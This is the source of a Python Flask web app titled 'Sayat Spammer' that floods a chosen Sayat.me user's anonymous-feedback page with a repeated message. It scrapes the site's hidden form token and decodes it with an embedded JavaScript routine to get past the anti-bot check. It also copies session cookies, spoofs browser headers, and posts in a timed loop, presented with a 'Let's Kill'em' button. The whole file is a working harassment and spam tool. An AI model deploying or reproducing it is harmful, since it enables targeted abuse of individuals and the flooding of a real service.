from flask import Flask,request,Response
from requests_toolbelt.adapters import appengine
appengine.monkeypatch()
import requests,json
app = Flask(__name__)
app.config['DEBUG'] = True

# Note: We don't need to call run() since our application is embedded within
# the App Engine WSGI application server.



	
@app.route('/')
def hello():
    """Return a friendly HTTP greeting."""
    return """
<html>
<meta name=viewport content="width=device-width, initial-scale=1">
<title>Sayat Spammer</title>
<body>
Enter Sayat.me feedback url :
<input type="text" placeholder="https://sayat.me/someuserid" id="phno" onkeydown = "if (event.keyCode == 13)
                        document.getElementById('clickme').click()" size=40 onclick = "document.getElementById('phno').size=25"
                        onfocusout="if (document.getElementById('phno').value.length == 0) {document.getElementById('phno').size=40}"/><br><br>
Enter ur Feedback :
<input type="text" placeholder="this msg will be flooded" id="feedback" onkeydown = "if (event.keyCode == 13)
                        document.getElementById('clickme').click()" size=40 onclick = "document.getElementById('feedback').size=70"
                        onfocusout="if (document.getElementById('feedback').value.length == 0) {document.getElementById('feedback').size=40}"/>
<br><button id="clickme">Let's Kill'em</button>
<br><p id="op"></p>
<script>
	document.getElementById("clickme").addEventListener("click", clicked);
	function destroy(aifrm,bbt){return function(){aifrm.parentNode.removeChild(aifrm);bbt.parentNode.removeChild(bbt);};}
serialize = function(obj) {
  var str = [];
  for(var p in obj)
    if (obj.hasOwnProperty(p)) {
      str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
    }
  return str.join("&");
}
function getUrlVars() {
    var vars = {};
    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi,    
    function(m,key,value) {
      vars[key] = value;
    });
	if (!vars['gap']) {vars['gap']=1000;}
	vars['gap']=parseInt(vars['gap']);
    return vars;
  }    
  function clicked()
  {
  var p=document.getElementById("phno").value;
  var jsonmsg=document.getElementById("feedback").value;
  var k="";
  if (getUrlVars()["k"])k="&k="getUrlVars()["k"]
  jsonmsg=serialize({feedback:JSON.stringify(jsonmsg)});
ifrm = document.createElement("IFRAME");
ifrm.setAttribute("src", "/sayat?phno="+p+"&"+jsonmsg+k);
ifrm.setAttribute("style","display:;border:none;width:225px;margin-bottom:15px");
ifrm.setAttribute("id","frm");
bt = document.createElement("button");
bt.innerText="X";
bt.style="vertical-align:top; display:inline; margin-left:17px";
bt.onclick=destroy(ifrm,bt);
//ifrm.style.width = 640+"px";
//ifrm.style.height = 480+"px";
document.body.appendChild(bt);
document.body.appendChild(ifrm);
  }
</script>
</body>
</html>	"""


@app.errorhandler(404)
def page_not_found(e):
    """Return a custom 404 error."""
    return 'Sorry, nothing at this URL. Chup chap apna kaam kar...', 404



    
@app.route('/sayat')
def sayatme():
    return """
	<html>
	<body>
	Attempted <h2 style="display: inline"><span id='num'>0</span></h2> times.<br>Attempting <span id='total'>0</span> :<button id='bt'>Pause</button><p id='update'></p>
	<script>
	var log=0;
	var interval;
	document.getElementById("bt").addEventListener("click", function(){
	action=document.getElementById("bt").innerHTML;
	if (action=='Pause') 
	{
	clearInterval(interval);
	document.getElementById("bt").innerHTML='Resume';
	} else {
	document.getElementById("bt").innerHTML='Pause';
	loadinit();
	}
	});
	serialize = function(obj) {
  var str = [];
  for(var p in obj)
    if (obj.hasOwnProperty(p)) {
      str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
    }
  return str.join("&");
};

	function getUrlVars() {
    var vars = {};
    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi,    
    function(m,key,value) {
      vars[key] = value;
    });
	if (!vars['gap']) {vars['gap']=1000;}
	vars['gap']=parseInt(vars['gap']);
    return vars;
  }    
	function init(){
	var i;var j;var k;
	
	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function() {
    if (xhttp.readyState == 4 && xhttp.status == 200) {
      document.getElementById("num").innerHTML = parseInt(document.getElementById("num").innerHTML)+1;
	  document.getElementById("update").innerHTML = (JSON.parse(xhttp.responseText))['show'];
	  log=(JSON.parse(xhttp.responseText))['log'];
    }
  };
  
  //xhttp.open("GET", "flood?p="+getUrlVars()["phno"]+"&w="+getUrlVars()["feedback"], true);
  //xhttp.open("GET", "flood?"+serialize({p:getUrlVars()["phno"],w:JSON.stringify(getUrlVars()["feedback"])}), true);
  xhttp.open("GET", "flood?"+serialize({p:getUrlVars()["phno"],w:(getUrlVars()["feedback"]),k:(getUrlVars()["k"])?(getUrlVars()["k"]):1}), true);
  xhttp.send();
  document.getElementById("total").innerHTML = parseInt(document.getElementById("total").innerHTML)+1;
	
	}
	
	function loadinit(){interval=setInterval(init,getUrlVars()['gap'])}
	window.onload =loadinit;
	
	</script>
	</body>
	</html>
	"""

@app.route('/flood')
def bsnl():
    import json,urllib
    w=urllib.unquote(request.args['w']).decode('utf8')
    #print(w)
    mob,writeup,k=request.args['p'],json.loads(w),int(request.args.get('k','1'))
    blacklist={"9409261078":"ZOHAN!!!"}#,"9998623001":"Batman."}
    if sum([writeup.count(idata) for idata in blacklist.keys()]):
        class RRR:content="dhoka"
        r,msg=RRR(),blacklist[filter((lambda x:writeup.count(x)),blacklist.keys())[0]]
    else:msg,r=try1(mob,writeup,k)
    
    returns= json.dumps({'show':msg if r else 'Failing [check url]','log':unicode(r.content if r else 'failed',errors='ignore')})
    
    resp = Response(returns)
    sender=request.headers.get('origin')
    resp.headers['Access-Control-Allow-Origin'] = sender if sender in ['https://smartm13.github.io','http://smartm13.github.io'] else "SAME-ORIGIN"
    try:resp.headers['Content-type']='text/html; charset=utf-8; data='+mob
    except:pass#resp.headers['sentdata']='null'
    return resp
	
def makecookie(setcookie):
#    """Return dict of cookies from value of setcookie header [formated 'atr=val; ']"""
    cok={}
    s=0
    t=setcookie
    while 1:
        s=t.find('=',s)+1
        if not s:break
        e=None if t.find(';',s)==-1 else t.find(';',s)
        val=t[s:e]
        sw=t.rfind(" ",0,s)     #find space just b4 s
        atr=t[sw+1:s-1]
        cok[atr]=val
    return cok

def try1(url,writeup,k=1):
	import requests
	import js2py
	jscode ='function mainwa(r){function n(r){return"0123456789abcdefghijklmnopqrstuvwxyz".charAt(r)}var t,a=[];t=r;var e,f,h="",o=0;for(e=0;e<t.length&&"="!=t.charAt(e);++e)v="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".indexOf(t.charAt(e)),0>v||(0==o?(h+=n(v>>2),f=3&v,o=1):1==o?(h+=n(f<<2|v>>4),f=15&v,o=2):2==o?(h+=n(f),h+=n(v>>2),f=3&v,o=3):(h+=n(f<<2|v>>4),h+=n(15&v),o=0));for(1==o&&(h+=n(f<<2)),t=h,e=[],h=0;2*h<t.length;++h)e[h]=parseInt(t.substring(2*h,2*h+2),16);for(k=e[0],i=1;i<e.length;++i)a[i-1]=e[i]^k;return a=String.fromCharCode.apply(String,a)}'
	bar2foo = js2py.eval_js(jscode) 
	r=requests.get(url)
	rc=r.content
	C=makecookie(r.headers['set-cookie'])#r.cookies.get_dict()
	#print(C)
	strb='name="bar" id="bar" value="'
	bar=rc[rc.find(strb)+len(strb):rc.find('"',rc.find(strb)+len(strb))]
	Headers={
    'Origin': 'https://sayat.me',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': url,
    'Connection': 'keep-alive',
}
	Data = [
  ('write', writeup),
  ('more_feedback_input', ''),
  ('foo', bar2foo(bar)),
  ('bar', bar),
  ('full_name', ''),
  ('password', ''),
  ('password_confirm', ''),
  ('url', ''),
  ('csam', C['csam']),
]
	for i in [0]*k:m=requests.post(url, headers=Headers, cookies=C, data=Data)
	mc=m.content
	strm=mc.find('wrap-words">')+12
	op=mc[strm:mc.find('</',strm)]
	return op,m
